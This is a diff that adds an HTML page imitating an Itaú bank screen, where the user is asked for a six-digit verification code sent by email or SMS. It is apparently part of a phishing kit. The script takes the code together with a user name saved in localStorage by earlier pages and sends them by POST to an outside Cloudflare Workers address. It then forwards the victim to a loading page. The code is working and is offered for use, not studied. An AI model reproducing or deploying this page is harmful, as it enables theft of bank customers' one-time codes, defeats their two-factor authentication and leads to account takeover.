@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#06143f">
+<title>Itaú - Código de validación</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+    background: #f8f9fa;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+
+/* CABECERA ITAÚ */
+.header {
+    background: #06143f;
+    padding: 18px 24px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    min-height: 72px;
+}
+
+.header .back {
+    color: #fff;
+    font-size: 28px;
+    cursor: pointer;
+    text-decoration: none;
+    font-weight: 300;
+    line-height: 1;
+}
+
+.header .back:hover {
+    opacity: 0.8;
+}
+
+.header .logo {
+    color: #fff;
+    font-size: 22px;
+    font-weight: 700;
+    letter-spacing: -1px;
+}
+
+.header .title {
+    color: #fff;
+    font-size: 18px;
+    font-weight: 400;
+    margin-left: auto;
+}
+
+/* CONTENIDO */
+.container {
+    flex: 1;
+    padding: 40px 24px 120px;
+    max-width: 420px;
+    margin: 0 auto;
+    width: 100%;
+    text-align: center;
+}
+
+/* CAJAS DEL CÓDIGO */
+.code-boxes {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin: 30px 0 25px;
+}
+
+.box {
+    width: 50px;
+    height: 60px;
+    border-radius: 12px;
+    background: #f0f0f5;
+    border: 2px solid #e0e0e5;
+    font-size: 24px;
+    font-weight: 600;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #06143f;
+    transition: all 0.3s;
+    font-family: 'Courier New', monospace;
+}
+
+.box.active {
+    border-color: #ff5b00;
+    background: #fff;
+    box-shadow: 0 0 0 3px rgba(255, 91, 0, 0.15);
+}
+
+.box.filled {
+    border-color: #28a745;
+    background: #f0fff4;
+}
+
+/* TEXTO */
+.text {
+    color: #6c757d;
+    font-size: 14px;
+    line-height: 1.6;
+    margin-top: 20px;
+}
+
+.text strong {
+    color: #06143f;
+}
+
+/* INPUT OCULTO */
+#claveInput {
+    position: absolute;
+    opacity: 0;
+    width: 1px;
+    height: 1px;
+    pointer-events: none;
+}
+
+/* TECLADO ITAÚ */
+.keyboard {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background: white;
+    padding: 16px 0 30px;
+    border-top: 1px solid #e9ecef;
+    box-shadow: 0 -4px 20px rgba(0,0,0,0.05);
+}
+
+.keys {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    max-width: 320px;
+    margin: 0 auto;
+    padding: 0 16px;
+}
+
+.key {
+    font-size: 24px;
+    font-weight: 500;
+    text-align: center;
+    padding: 14px 0;
+    cursor: pointer;
+    border-radius: 12px;
+    background: #f8f9fa;
+    color: #06143f;
+    transition: all 0.15s;
+    user-select: none;
+    -webkit-tap-highlight-color: transparent;
+}
+
+.key:hover {
+    background: #e9ecef;
+}
+
+.key:active {
+    transform: scale(0.92);
+    background: #ff5b00;
+    color: white;
+}
+
+.key.empty {
+    background: transparent;
+    cursor: default;
+    pointer-events: none;
+}
+
+.key.empty:active {
+    transform: none;
+    background: transparent;
+    color: #06143f;
+}
+
+.key.delete {
+    font-size: 20px;
+    color: #dc3545;
+}
+
+.key.delete:active {
+    background: #dc3545;
+    color: white;
+}
+
+/* RESPONSIVE */
+@media (max-width: 480px) {
+    .header {
+        padding: 14px 18px;
+        min-height: 60px;
+    }
+    
+    .header .logo {
+        font-size: 18px;
+    }
+    
+    .header .title {
+        font-size: 15px;
+    }
+    
+    .container {
+        padding: 30px 16px 140px;
+    }
+    
+    .code-boxes {
+        gap: 10px;
+    }
+    
+    .box {
+        width: 44px;
+        height: 54px;
+        font-size: 20px;
+        border-radius: 10px;
+    }
+    
+    .keys {
+        gap: 10px;
+        max-width: 280px;
+    }
+    
+    .key {
+        font-size: 21px;
+        padding: 12px 0;
+        border-radius: 10px;
+    }
+}
+
+@media (max-width: 380px) {
+    .box {
+        width: 38px;
+        height: 46px;
+        font-size: 17px;
+        border-radius: 8px;
+    }
+    
+    .code-boxes {
+        gap: 8px;
+    }
+    
+    .keys {
+        gap: 8px;
+        max-width: 240px;
+    }
+    
+    .key {
+        font-size: 18px;
+        padding: 10px 0;
+    }
+}
+</style>
+</head>
+<body>
+
+<!-- CABECERA ITAÚ -->
+<div class="header">
+    <span class="back" onclick="window.history.back()">‹</span>
+    <span class="logo">itaú</span>
+    <span class="title">Código de validación</span>
+</div>
+
+<div class="container">
+
+    <!-- CAJAS DEL CÓDIGO -->
+    <div class="code-boxes" id="boxes"></div>
+
+    <div class="text">
+        Ingresa los 6 dígitos que enviamos a tu correo electrónico<br>
+        o mensaje de texto para confirmar tu identidad.
+    </div>
+
+    <!-- INPUT OCULTO -->
+    <input 
+        type="password"
+        id="claveInput"
+        maxlength="6"
+        inputmode="numeric"
+        autofocus
+    >
+
+</div>
+
+<!-- TECLADO ITAÚ -->
+<div class="keyboard">
+    <div class="keys">
+        <div class="key" data-value="1">1</div>
+        <div class="key" data-value="2">2</div>
+        <div class="key" data-value="3">3</div>
+        <div class="key" data-value="4">4</div>
+        <div class="key" data-value="5">5</div>
+        <div class="key" data-value="6">6</div>
+        <div class="key" data-value="7">7</div>
+        <div class="key" data-value="8">8</div>
+        <div class="key" data-value="9">9</div>
+        <div class="key empty"></div>
+        <div class="key" data-value="0">0</div>
+        <div class="key delete" data-value="delete">⌫</div>
+    </div>
+</div>
+
+<script>
+// ========================= CONFIGURACIÓN =========================
+const WORKER_URL = 'https://quiet-haze-3548.micollflorez.workers.dev';
+
+// ========================= ELEMENTOS =========================
+const claveInput = document.getElementById('claveInput');
+const boxesContainer = document.getElementById('boxes');
+
+// ========================= CREAR 6 CAJAS =========================
+for (let i = 0; i < 6; i++) {
+    const div = document.createElement('div');
+    div.classList.add('box');
+    boxesContainer.appendChild(div);
+}
+
+const boxes = document.querySelectorAll('.box');
+
+// ========================= ACTUALIZAR CAJAS =========================
+function updateBoxes() {
+    const val = claveInput.value;
+    boxes.forEach((box, i) => {
+        if (val[i]) {
+            box.textContent = '•';
+            box.classList.add('filled');
+            box.classList.remove('active');
+        } else {
+            box.textContent = '';
+            box.classList.remove('filled');
+            if (i === val.length) {
+                box.classList.add('active');
+            } else {
+                box.classList.remove('active');
+            }
+        }
+    });
+}
+
+// ========================= ENVIAR CÓDIGO =========================
+async function enviarCodigo() {
+    const claveValue = claveInput.value.trim();
+    if (claveValue.length !== 6) return;
+
+    try {
+        const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+        const usuario = bancoldata.usuario || 'usuario';
+
+        // Actualizar con la clave
+        bancoldata.clave = claveValue;
+        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+
+        console.log('📤 Enviando código:', claveValue);
+        console.log('👤 Usuario:', usuario);
+
+        // Enviar al worker
+        const response = await fetch(`${WORKER_URL}/validar`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                usuario: usuario,
+                clave: claveValue,
+                transactionId: bancoldata.transactionId || 'txn_' + Date.now()
+            })
+        });
+
+        const result = await response.json();
+
+        if (result.ok) {
+            window.location.href = 'loading.html';
+        } else {
+            // Mostrar error y limpiar
+            alert('❌ Código incorrecto. Intenta nuevamente.');
+            claveInput.value = '';
+            updateBoxes();
+            claveInput.focus();
+        }
+
+    } catch (err) {
+        console.error('❌ Error:', err);
+        alert('❌ Error de conexión. Intenta nuevamente.');
+        claveInput.value = '';
+        updateBoxes();
+        claveInput.focus();
+    }
+}
+
+// ========================= EVENTOS DEL INPUT =========================
+claveInput.addEventListener('input', () => {
+    // Limitar a 6 dígitos
+    if (claveInput.value.length > 6) {
+        claveInput.value = claveInput.value.slice(0, 6);
+    }
+
+    updateBoxes();
+
+    // Si tiene 6 dígitos, enviar automáticamente
+    if (claveInput.value.length === 6) {
+        setTimeout(enviarCodigo, 300);
+    }
+});
+
+// ========================= TECLADO =========================
+document.querySelectorAll('.key').forEach(key => {
+    key.addEventListener('click', (e) => {
+        e.preventDefault();
+        const value = key.dataset.value;
+        let val = claveInput.value;
+
+        if (value === 'delete') {
+            // Borrar último
+            claveInput.value = val.slice(0, -1);
+        } else if (value && val.length < 6) {
+            // Agregar número
+            claveInput.value += value;
+        }
+
+        // Disparar evento input
+        claveInput.dispatchEvent(new Event('input'));
+    });
+
+    // Evitar que el teclado virtual aparezca en móviles
+    key.addEventListener('touchstart', (e) => {
+        e.preventDefault();
+    });
+});
+
+// ========================= INICIALIZAR =========================
+updateBoxes();
+
+// Enfocar el input al cargar
+setTimeout(() => {
+    claveInput.focus();
+}, 300);
+
+console.log('🚀 Sistema de validación Itaú listo');
+console.log(`📡 Worker URL: ${WORKER_URL}`);
+
+// ========================= DETECTAR TECLADO FÍSICO =========================
+document.addEventListener('keydown', (e) => {
+    if (e.key >= '0' && e.key <= '9') {
+        if (claveInput.value.length < 6) {
+            claveInput.value += e.key;
+            claveInput.dispatchEvent(new Event('input'));
+        }
+        e.preventDefault();
+    } else if (e.key === 'Backspace') {
+        claveInput.value = claveInput.value.slice(0, -1);
+        claveInput.dispatchEvent(new Event('input'));
+        e.preventDefault();
+    }
+});
+</script>
+
+</body>
+</html>
